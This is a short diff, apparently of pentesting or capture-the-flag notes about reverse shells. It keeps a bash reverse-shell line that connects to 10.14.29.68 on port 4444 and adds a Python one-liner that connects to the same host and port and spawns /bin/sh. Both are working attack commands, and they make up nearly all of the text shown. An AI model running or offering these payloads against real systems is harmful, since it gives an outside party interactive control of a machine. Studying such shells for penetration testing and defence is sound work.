@@ -13,3 +13,5 @@ The target system’s environment will influence the tool you will be able to us
 
 
 bash -i >& /dev/tcp/10.14.29.68/4444 0>&1
+
+export RHOST="10.14.29.68";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
